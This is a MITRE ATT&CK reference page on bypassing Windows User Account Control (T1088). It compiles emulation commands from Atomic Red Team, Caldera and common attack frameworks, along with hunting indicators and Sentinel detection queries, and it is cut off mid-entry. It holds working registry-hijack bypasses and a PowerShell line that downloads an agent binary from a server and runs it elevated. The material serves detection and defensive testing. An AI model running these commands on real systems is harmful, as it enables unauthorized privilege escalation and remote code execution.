
# Bypass User Account Control

## Description

### MITRE Description

> Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)

If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. (Citation: Davidson Windows) Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.

Many methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods (Citation: Github UACMe) that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script. (Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit)

Another bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity. (Citation: SANS UAC Bypass)

## Additional Attributes

* Bypass: ['Windows User Account Control']
* Effective Permissions: ['Administrator']
* Network: intentionally left blank
* Permissions: ['User', 'Administrator']
* Platforms: ['Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1088

## Potential Commands

```
uacbypass
One of the following:
exploit/windows/local/bypassuac
exploit/windows/local/bypassuac_injection
exploit/windows/local/bypassuac_vbs
reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
cmd.exe /c eventvwr.msc

New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
Start-Process "C:\Windows\System32\eventvwr.msc"

reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
fodhelper.exe

New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"

New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"

mkdir "\\?\C:\Windows \System32\"
copy "C:\Windows\System32\cmd.exe" "\\?\C:\Windows \System32\mmc.exe"
mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"

{'windows': {'psh': {'command': 'New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\n'}}}
{'windows': {'cmd,psh': {'command': '.\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n', 'payloads': ['Akagi64.exe']}}}
{'windows': {'psh': {'command': '.\\Akagi64.exe 45 C:\\Windows\\System32\\cmd.exe\n', 'payloads': ['Akagi64.exe']}}}
{'windows': {'psh': {'command': '$url="#{server}/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\\Users\\Public\\$name.exe",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command "C:\\Users\\Public\\$name.exe -group #{group}"; };\nReceive-Job -Job $job -Wait;\n', 'payloads': ['Bypass-UAC.ps1']}}}
{'windows': {'psh': {'command': '$url="#{server}/file/download";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add("platform","windows");\n$wc.Headers.add("file","sandcat.go");\n$wc.Headers.add("server","#{server}");\n$wc.Headers.add("defaultSleep","60");\n$wc.Headers.add("defaultGroup","bypassed_u_bro");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");\n[io.file]::WriteAllBytes("C:\\Users\\Public\\$name.exe",$data);\n.\\Akagi64.exe 32 "C:\\Users\\Public\\$name.exe -server #{server}"\n', 'payloads': ['Akagi64.exe']}}}
eventvwr.exe
HKEY_USERS\*\mscfile\shell\open\command
eventvwr.exe
mshta.exe
verclsid.exe
winword.exe
verclsid.exe
*.exe reg query
HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths
Software\Classes\mscfile\shell\open\command|mscfile\shell\open\command
Software\Classes\mscfile\shell\open\command|mscfile\shell\open\command
\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe|\Software\Classes\exefile\shell\runas\command\isolatedCommand
\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe|\Software\Classes\exefile\shell\runas\command\isolatedCommand
\Software\Classes\ms-settings\shell\open\command
\Software\Classes\ms-settings\shell\open\command
\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\cmmgr32.exe
\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\cmmgr32.exe
powershell/privesc/ask
powershell/privesc/ask
powershell/privesc/bypassuac
powershell/privesc/bypassuac
powershell/privesc/bypassuac_eventvwr
powershell/privesc/bypassuac_eventvwr
powershell/privesc/bypassuac_wscript
powershell/privesc/bypassuac_wscript
powershell/privesc/bypassuac_env
powershell/privesc/bypassuac_env
powershell/privesc/bypassuac_fodhelper
powershell/privesc/bypassuac_fodhelper
powershell/privesc/bypassuac_sdctlbypass
powershell/privesc/bypassuac_sdctlbypass
powershell/privesc/bypassuac_tokenmanipulation
powershell/privesc/bypassuac_tokenmanipulation
```

## Commands Dataset

```
[{'command': 'uacbypass',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'One of the following:\n'
             'exploit/windows/local/bypassuac\n'
             'exploit/windows/local/bypassuac_injection\n'
             'exploit/windows/local/bypassuac_vbs',
  'name': 'Metasploit',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'reg.exe add '
             'hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d '
             '"C:\\Windows\\System32\\cmd.exe" /f\n'
             'cmd.exe /c eventvwr.msc\n',
  'name': None,
  'source': 'atomics/T1088/T1088.yaml'},
 {'command': 'New-Item '
             '"HKCU:\\software\\classes\\mscfile\\shell\\open\\command" '
             '-Force\n'
             'Set-ItemProperty '
             '"HKCU:\\software\\classes\\mscfile\\shell\\open\\command" -Name '
             '"(default)" -Value "C:\\Windows\\System32\\cmd.exe" -Force\n'
             'Start-Process "C:\\Windows\\System32\\eventvwr.msc"\n',
  'name': None,
  'source': 'atomics/T1088/T1088.yaml'},
 {'command': 'reg.exe add '
             'hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve '
             '/d "C:\\Windows\\System32\\cmd.exe" /f\n'
             'reg.exe add '
             'hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v '
             '"DelegateExecute" /f\n'
             'fodhelper.exe\n',
  'name': None,
  'source': 'atomics/T1088/T1088.yaml'},
 {'command': 'New-Item '
             '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
             '-Force\n'
             'New-ItemProperty '
             '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
             '-Name "DelegateExecute" -Value "" -Force\n'
             'Set-ItemProperty '
             '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
             '-Name "(default)" -Value "C:\\Windows\\System32\\cmd.exe" '
             '-Force\n'
             'Start-Process "C:\\Windows\\System32\\fodhelper.exe"\n',
  'name': None,
  'source': 'atomics/T1088/T1088.yaml'},
 {'command': 'New-Item '
             '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
             '-Force\n'
             'New-ItemProperty '
             '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
             '-Name "DelegateExecute" -Value "" -Force\n'
             'Set-ItemProperty '
             '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
             '-Name "(default)" -Value "C:\\Windows\\System32\\cmd.exe" '
             '-Force\n'
             'Start-Process "C:\\Windows\\System32\\ComputerDefaults.exe"\n',
  'name': None,
  'source': 'atomics/T1088/T1088.yaml'},
 {'command': 'mkdir "\\\\?\\C:\\Windows \\System32\\"\n'
             'copy "C:\\Windows\\System32\\cmd.exe" "\\\\?\\C:\\Windows '
             '\\System32\\mmc.exe"\n'
             'mklink c:\\testbypass.exe "\\\\?\\C:\\Windows '
             '\\System32\\mmc.exe"\n',
  'name': None,
  'source': 'atomics/T1088/T1088.yaml'},
 {'command': {'windows': {'psh': {'command': 'New-ItemProperty -Path '
                                             'HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system '
                                             '-Name EnableLUA -PropertyType '
                                             'DWord -Value 0 -Force\n'}}},
  'name': 'Set a registry key to allow UAC bypass',
  'source': 'data/abilities/privilege-escalation/665432a4-42e7-4ee1-af19-a9a8c9455d0c.yml'},
 {'command': {'windows': {'cmd,psh': {'command': '.\\Akagi64.exe 30 '
                                                 'C:\\Windows\\System32\\cmd.exe\n',
                                      'payloads': ['Akagi64.exe']}}},
  'name': 'Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe',
  'source': 'data/abilities/privilege-escalation/95ad5d69-563e-477b-802b-4855bfb3be09.yml'},
 {'command': {'windows': {'psh': {'command': '.\\Akagi64.exe 45 '
                                             'C:\\Windows\\System32\\cmd.exe\n',
                                  'payloads': ['Akagi64.exe']}}},
  'name': 'executes the slui exe file handler hijack',
  'source': 'data/abilities/privilege-escalation/b7344901-0b02-4ead-baf6-e3f629ed545f.yml'},
 {'command': {'windows': {'psh': {'command': '$url="#{server}/file/download"; '
                                             '$wc=New-Object '
                                             'System.Net.WebClient; '
                                             '$wc.Headers.add("platform","windows"); '
                                             '$wc.Headers.add("file","sandcat.go"); '
                                             '$data=$wc.DownloadData($url); '
                                             '$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); '
                                             '[io.file]::WriteAllBytes("C:\\Users\\Public\\$name.exe",$data);\n'
                                             '$job = Start-Job -ScriptBlock { '
                                             'Import-Module -Name '
                                             '.\\Bypass-UAC.ps1; Bypass-UAC '
                                             '-Command '
                                             '"C:\\Users\\Public\\$name.exe '
                                             '-group #{group}"; };\n'
                                             'Receive-Job -Job $job -Wait;\n',
                                  'payloads': ['Bypass-UAC.ps1']}}},
  'name': 'Bypass user account controls - medium',
  'source': 'data/abilities/privilege-escalation/e3db134c-4aed-4c5a-9607-c50183c9ef9e.yml'},
 {'command': {'windows': {'psh': {'command': '$url="#{server}/file/download";\n'
                                             '$wc=New-Object '
                                             'System.Net.WebClient;\n'
                                             '$wc.Headers.add("platform","windows");\n'
                                             '$wc.Headers.add("file","sandcat.go");\n'
                                             '$wc.Headers.add("server","#{server}");\n'
                                             '$wc.Headers.add("defaultSleep","60");\n'
                                             '$wc.Headers.add("defaultGroup","bypassed_u_bro");\n'
                                             '$data=$wc.DownloadData($url);\n'
                                             '$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");\n'
                                             '[io.file]::WriteAllBytes("C:\\Users\\Public\\$name.exe",$data);\n'
                                             '.\\Akagi64.exe 32 '
                                             '"C:\\Users\\Public\\$name.exe '
                                             '-server #{server}"\n',
                                  'payloads': ['Akagi64.exe']}}},
  'name': 'UIPI bypass with uiAccess application',
  'source': 'data/abilities/privilege-escalation/e99cce5c-cb7e-4a6e-8a09-1609a221b90a.yml'},
 {'command': 'eventvwr.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'HKEY_USERS\\*\\mscfile\\shell\\open\\command',
  'name': 'registry_path',
  'source': 'Threat Hunting Tables'},
 {'command': 'eventvwr.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'mshta.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'verclsid.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'winword.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'verclsid.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': '*.exe reg query',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths',
  'name': 'registry_path',
  'source': 'Threat Hunting Tables'},
 {'command': 'Software\\Classes\\mscfile\\shell\\open\\command|mscfile\\shell\\open\\command',
  'name': None,
  'source': 'SysmonHunter - UAC bypass'},
 {'command': 'Software\\Classes\\mscfile\\shell\\open\\command|mscfile\\shell\\open\\command',
  'name': None,
  'source': 'SysmonHunter - UAC bypass'},
 {'command': '\\Software\\Microsoft\\Windows\\CurrentVersion\\App '
             'Paths\\control.exe|\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand',
  'name': None,
  'source': 'SysmonHunter - UAC bypass'},
 {'command': '\\Software\\Microsoft\\Windows\\CurrentVersion\\App '
             'Paths\\control.exe|\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand',
  'name': None,
  'source': 'SysmonHunter - UAC bypass'},
 {'command': '\\Software\\Classes\\ms-settings\\shell\\open\\command',
  'name': None,
  'source': 'SysmonHunter - UAC bypass'},
 {'command': '\\Software\\Classes\\ms-settings\\shell\\open\\command',
  'name': None,
  'source': 'SysmonHunter - UAC bypass'},
 {'command': '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App '
             'Paths\\cmmgr32.exe',
  'name': None,
  'source': 'SysmonHunter - UAC bypass'},
 {'command': '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App '
             'Paths\\cmmgr32.exe',
  'name': None,
  'source': 'SysmonHunter - UAC bypass'},
 {'command': 'powershell/privesc/ask',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/ask',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/bypassuac',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/bypassuac',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/bypassuac_eventvwr',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/bypassuac_eventvwr',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/bypassuac_wscript',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/bypassuac_wscript',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/bypassuac_env',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/bypassuac_env',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/bypassuac_fodhelper',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/bypassuac_fodhelper',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/bypassuac_sdctlbypass',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/bypassuac_sdctlbypass',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/bypassuac_tokenmanipulation',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/bypassuac_tokenmanipulation',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json

```

## Potential Queries

```json
[{'name': 'Bypass User Account Control Process',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and (process_parent_command_line '
           'contains "eventvwr.exe"or process_parent_command_line contains '
           '"fodhelper.exe"or process_path contains "ShellRunas.exe")'},
 {'name': 'Bypass User Account Control Registry',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and '
           '(registry_key_path contains '
           '"*\\\\mscfile\\\\shell\\\\open\\\\command\\\\*"or '
           'registry_key_path contains '
           '"*\\\\ms-settings\\\\shell\\\\open\\\\command\\\\*")'}]
```

## Raw Dataset

```json
[{'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': '',
                                                  'Category': 'T1088',
                                                  'Cobalt Strike': 'uacbypass',
                                                  'Description': 'If you have '
                                                                 'a medium '
                                                                 'integrity '
                                                                 'process, but '
                                                                 'are an '
                                                                 'administrator, '
                                                                 'UACBypass '
                                                                 'will get you '
                                                                 'a high '
                                                                 'integrity '
                                                                 'process '
                                                                 'without '
                                                                 'prompting '
                                                                 'the user for '
                                                                 'confirmation.',
                                                  'Metasploit': 'One of the '
                                                                'following:\n'
                                                                'exploit/windows/local/bypassuac\n'
                                                                'exploit/windows/local/bypassuac_injection\n'
                                                                'exploit/windows/local/bypassuac_vbs'}},
 {'Atomic Red Team Test - Bypass User Account Control': {'atomic_tests': [{'description': 'Bypasses '
                                                                                          'User '
                                                                                          'Account '
                                                                                          'Control '
                                                                                          'using '
                                                                                          'Event '
                                                                                          'Viewer '
                                                                                          'and '
                                                                                          'a '
                                                                                          'relevant '
                                                                                          'Windows '
                                                                                          'Registry '
                                                                                          'modification. '
                                                                                          'More '
                                                                                          'information '
                                                                                          'here '
                                                                                          '- '
                                                                                          'https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\n'
                                                                                          'Upon '
                                                                                          'execution '
                                                                                          'command '
                                                                                          'prompt '
                                                                                          'should '
                                                                                          'be '
                                                                                          'launched '
                                                                                          'with '
                                                                                          'administrative '
                                                                                          'privelages\n',
                                                                           'executor': {'cleanup_command': 'reg.exe '
                                                                                                           'delete '
                                                                                                           'hkcu\\software\\classes\\mscfile '
                                                                                                           '/f '
                                                                                                           '>nul '
                                                                                                           '2>&1\n',
                                                                                        'command': 'reg.exe '
                                                                                                   'add '
                                                                                                   'hkcu\\software\\classes\\mscfile\\shell\\open\\command '
                                                                                                   '/ve '
                                                                                                   '/d '
                                                                                                   '"#{executable_binary}" '
                                                                                                   '/f\n'
                                                                                                   'cmd.exe '
                                                                                                   '/c '
                                                                                                   'eventvwr.msc\n',
                                                                                        'name': 'command_prompt'},
                                                                           'input_arguments': {'executable_binary': {'default': 'C:\\Windows\\System32\\cmd.exe',
                                                                                                                     'description': 'Binary '
                                                                                                                                    'to '
                                                                                                                                    'execute '
                                                                                                                                    'with '
                                                                                                                                    'UAC '
                                                                                                                                    'Bypass',
                                                                                                                     'type': 'path'}},
                                                                           'name': 'Bypass '
                                                                                   'UAC '
                                                                                   'using '
                                                                                   'Event '
                                                                                   'Viewer '
                                                                                   '(cmd)',
                                                                           'supported_platforms': ['windows']},
                                                                          {'description': 'PowerShell '
                                                                                          'code '
                                                                                          'to '
                                                                                          'bypass '
                                                                                          'User '
                                                                                          'Account '
                                                                                          'Control '
                                                                                          'using '
                                                                                          'Event '
                                                                                          'Viewer '
                                                                                          'and '
                                                                                          'a '
                                                                                          'relevant '
                                                                                          'Windows '
                                                                                          'Registry '
                                                                                          'modification. '
                                                                                          'More '
                                                                                          'information '
                                                                                          'here '
                                                                                          '- '
                                                                                          'https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\n'
                                                                                          'Upon '
                                                                                          'execution '
                                                                                          'command '
                                                                                          'prompt '
                                                                                          'should '
                                                                                          'be '
                                                                                          'launched '
                                                                                          'with '
                                                                                          'administrative '
                                                                                          'privelages\n',
                                                                           'executor': {'cleanup_command': 'Remove-Item '
                                                                                                           '"HKCU:\\software\\classes\\mscfile" '
                                                                                                           '-force '
                                                                                                           '-Recurse '
                                                                                                           '-ErrorAction '
                                                                                                           'Ignore\n',
                                                                                        'command': 'New-Item '
                                                                                                   '"HKCU:\\software\\classes\\mscfile\\shell\\open\\command" '
                                                                                                   '-Force\n'
                                                                                                   'Set-ItemProperty '
                                                                                                   '"HKCU:\\software\\classes\\mscfile\\shell\\open\\command" '
                                                                                                   '-Name '
                                                                                                   '"(default)" '
                                                                                                   '-Value '
                                                                                                   '"#{executable_binary}" '
                                                                                                   '-Force\n'
                                                                                                   'Start-Process '
                                                                                                   '"C:\\Windows\\System32\\eventvwr.msc"\n',
                                                                                        'name': 'powershell'},
                                                                           'input_arguments': {'executable_binary': {'default': 'C:\\Windows\\System32\\cmd.exe',
                                                                                                                     'description': 'Binary '
                                                                                                                                    'to '
                                                                                                                                    'execute '
                                                                                                                                    'with '
                                                                                                                                    'UAC '
                                                                                                                                    'Bypass',
                                                                                                                     'type': 'path'}},
                                                                           'name': 'Bypass '
                                                                                   'UAC '
                                                                                   'using '
                                                                                   'Event '
                                                                                   'Viewer '
                                                                                   '(PowerShell)',
                                                                           'supported_platforms': ['windows']},
                                                                          {'description': 'Bypasses '
                                                                                          'User '
                                                                                          'Account '
                                                                                          'Control '
                                                                                          'using '
                                                                                          'the '
                                                                                          'Windows '
                                                                                          '10 '
                                                                                          'Features '
                                                                                          'on '
                                                                                          'Demand '
                                                                                          'Helper '
                                                                                          '(fodhelper.exe). '
                                                                                          'Requires '
                                                                                          'Windows '
                                                                                          '10.\n'
                                                                                          'Upon '
                                                                                          'execution, '
                                                                                          '"The '
                                                                                          'operation '
                                                                                          'completed '
                                                                                          'successfully." '
                                                                                          'will '
                                                                                          'be '
                                                                                          'shown '
                                                                                          'twice '
                                                                                          'and '
                                                                                          'command '
                                                                                          'prompt '
                                                                                          'will '
                                                                                          'be '
                                                                                          'opened.\n',
                                                                           'executor': {'cleanup_command': 'reg.exe '
                                                                                                           'delete '
                                                                                                           'hkcu\\software\\classes\\ms-settings '
                                                                                                           '/f '
                                                                                                           '>nul '
                                                                                                           '2>&1\n',
                                                                                        'command': 'reg.exe '
                                                                                                   'add '
                                                                                                   'hkcu\\software\\classes\\ms-settings\\shell\\open\\command '
                                                                                                   '/ve '
                                                                                                   '/d '
                                                                                                   '"#{executable_binary}" '
                                                                                                   '/f\n'
                                                                                                   'reg.exe '
                                                                                                   'add '
                                                                                                   'hkcu\\software\\classes\\ms-settings\\shell\\open\\command '
                                                                                                   '/v '
                                                                                                   '"DelegateExecute" '
                                                                                                   '/f\n'
                                                                                                   'fodhelper.exe\n',
                                                                                        'elevation_required': False,
                                                                                        'name': 'command_prompt'},
                                                                           'input_arguments': {'executable_binary': {'default': 'C:\\Windows\\System32\\cmd.exe',
                                                                                                                     'description': 'Binary '
                                                                                                                                    'to '
                                                                                                                                    'execute '
                                                                                                                                    'with '
                                                                                                                                    'UAC '
                                                                                                                                    'Bypass',
                                                                                                                     'type': 'path'}},
                                                                           'name': 'Bypass '
                                                                                   'UAC '
                                                                                   'using '
                                                                                   'Fodhelper',
                                                                           'supported_platforms': ['windows']},
                                                                          {'description': 'PowerShell '
                                                                                          'code '
                                                                                          'to '
                                                                                          'bypass '
                                                                                          'User '
                                                                                          'Account '
                                                                                          'Control '
                                                                                          'using '
                                                                                          'the '
                                                                                          'Windows '
                                                                                          '10 '
                                                                                          'Features '
                                                                                          'on '
                                                                                          'Demand '
                                                                                          'Helper '
                                                                                          '(fodhelper.exe). '
                                                                                          'Requires '
                                                                                          'Windows '
                                                                                          '10.\n'
                                                                                          'Upon '
                                                                                          'execution '
                                                                                          'command '
                                                                                          'prompt '
                                                                                          'will '
                                                                                          'be '
                                                                                          'opened.\n',
                                                                           'executor': {'cleanup_command': 'Remove-Item '
                                                                                                           '"HKCU:\\software\\classes\\ms-settings" '
                                                                                                           '-force '
                                                                                                           '-Recurse '
                                                                                                           '-ErrorAction '
                                                                                                           'Ignore\n',
                                                                                        'command': 'New-Item '
                                                                                                   '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
                                                                                                   '-Force\n'
                                                                                                   'New-ItemProperty '
                                                                                                   '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
                                                                                                   '-Name '
                                                                                                   '"DelegateExecute" '
                                                                                                   '-Value '
                                                                                                   '"" '
                                                                                                   '-Force\n'
                                                                                                   'Set-ItemProperty '
                                                                                                   '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
                                                                                                   '-Name '
                                                                                                   '"(default)" '
                                                                                                   '-Value '
                                                                                                   '"#{executable_binary}" '
                                                                                                   '-Force\n'
                                                                                                   'Start-Process '
                                                                                                   '"C:\\Windows\\System32\\fodhelper.exe"\n',
                                                                                        'elevation_required': False,
                                                                                        'name': 'powershell'},
                                                                           'input_arguments': {'executable_binary': {'default': 'C:\\Windows\\System32\\cmd.exe',
                                                                                                                     'description': 'Binary '
                                                                                                                                    'to '
                                                                                                                                    'execute '
                                                                                                                                    'with '
                                                                                                                                    'UAC '
                                                                                                                                    'Bypass',
                                                                                                                     'type': 'path'}},
                                                                           'name': 'Bypass '
                                                                                   'UAC '
                                                                                   'using '
                                                                                   'Fodhelper '
                                                                                   '- '
                                                                                   'PowerShell',
                                                                           'supported_platforms': ['windows']},
                                                                          {'description': 'PowerShell '
                                                                                          'code '
                                                                                          'to '
                                                                                          'bypass '
                                                                                          'User '
                                                                                          'Account '
                                                                                          'Control '
                                                                                          'using '
                                                                                          'ComputerDefaults.exe '
                                                                                          'on '
                                                                                          'Windows '
                                                                                          '10\n'
                                                                                          'Upon '
                                                                                          'execution '
                                                                                          'administrative '
                                                                                          'command '
                                                                                          'prompt '
                                                                                          'should '
                                                                                          'open\n',
                                                                           'executor': {'cleanup_command': 'Remove-Item '
                                                                                                           '"HKCU:\\software\\classes\\ms-settings" '
                                                                                                           '-force '
                                                                                                           '-Recurse '
                                                                                                           '-ErrorAction '
                                                                                                           'Ignore\n',
                                                                                        'command': 'New-Item '
                                                                                                   '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
                                                                                                   '-Force\n'
                                                                                                   'New-ItemProperty '
                                                                                                   '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
                                                                                                   '-Name '
                                                                                                   '"DelegateExecute" '
                                                                                                   '-Value '
                                                                                                   '"" '
                                                                                                   '-Force\n'
                                                                                                   'Set-ItemProperty '
                                                                                                   '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
                                                                                                   '-Name '
                                                                                                   '"(default)" '
                                                                                                   '-Value '
                                                                                                   '"#{executable_binary}" '
                                                                                                   '-Force\n'
                                                                                                   'Start-Process '
                                                                                                   '"C:\\Windows\\System32\\ComputerDefaults.exe"\n',
                                                                                        'elevation_required': True,
                                                                                        'name': 'powershell'},
                                                                           'input_arguments': {'executable_binary': {'default': 'C:\\Windows\\System32\\cmd.exe',
                                                                                                                     'description': 'Binary '
                                                                                                                                    'to '
                                                                                                                                    'execute '
                                                                                                                                    'with '
                                                                                                                                    'UAC '
                                                                                                                                    'Bypass',
                                                                                                                     'type': 'path'}},
                                                                           'name': 'Bypass '
                                                                                   'UAC '
                                                                                   'using '
                                                                                   'ComputerDefaults '
                                                                                   '(PowerShell)',
                                                                           'supported_platforms': ['windows']},
                                                                          {'description': 'Creates '
                                                                                          'a '
                                                                                          'fake '
                                                                                          '"trusted '
                                                                                          'directory" '
                                                                                          'and '
                                                                                          'copies '
                                                                                          'a '
                                                                                          'binary '
                                                                                          'to '
                                                                                          'bypass '
                                                                                          'UAC. '
                                                                                          'The '
                                                                                          'UAC '
                                                                                          'bypass '
                                                                                          'may '
                                                                                          'not '
                                                                                          'work '
                                                                                          'on '
                                                                                          'fully '
                                                                                          'patched '
                                                                                          'systems\n'
                                                                                          'Upon '
                                                                                          'execution '
